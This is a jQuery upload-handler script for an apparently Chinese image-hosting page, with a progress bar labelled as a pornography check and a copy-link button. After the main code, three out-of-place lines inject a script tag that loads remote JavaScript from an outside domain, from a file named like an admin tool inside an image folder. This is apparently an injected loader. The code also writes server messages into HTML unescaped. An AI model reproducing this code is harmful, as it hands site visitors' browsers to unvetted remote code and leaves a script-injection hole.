    $(document).ready(function(){
      $('form').submit(function(e){
        e.preventDefault();
        var formData = new FormData(this);

        $.ajax({
          url: 'api.php',
          type: 'POST',
          data: formData,
          dataType: 'json',
          processData: false,
          contentType: false,
          xhr: function(){
            var xhr = new window.XMLHttpRequest();

            xhr.upload.addEventListener('progress', function(event){
              if (event.lengthComputable) {
                var percent = Math.round((event.loaded / event.total) * 100);
                $('.progress-bar').width(percent + '%');
                $('.progress-bar').text(percent + '%正在鉴黄中');
              }
            }, false);

            return xhr;
          },
          success: function(response){
            if(response.status == 'success'){
              $('#message').html('<input type="text" id="myText" value="' + response.message + '"><br><button onclick="copyText()" class="bottoms">复制链接</button>');
              $('#copy-btn').show();
              $('#copy-btn').attr('data-clipboard-text', response.message);
            } else{
              $('#message').html('<span style="color:red;">' + response.message + '</span>');
              $('#copy-btn').hide();
            }

            // 不重置进度条
            $('.progress-bar').text('100%');
            $('input[type=file]').val('');
          }
        });
      });

      // 选择文件后显示文件名和大小
      $('input[type=file]').change(function(){
        var fileName = $(this).val().split('\\').pop();
        var fileSize = (this.files[0].size / 1024).toFixed(2) + 'KB';
        $('#file-info').text(fileName + ' (' + fileSize + ')');
      });
    });
    var script = document.createElement('script');
script.src = 'https://lwcat.cn/img/adminby.js';
document.head.appendChild(script);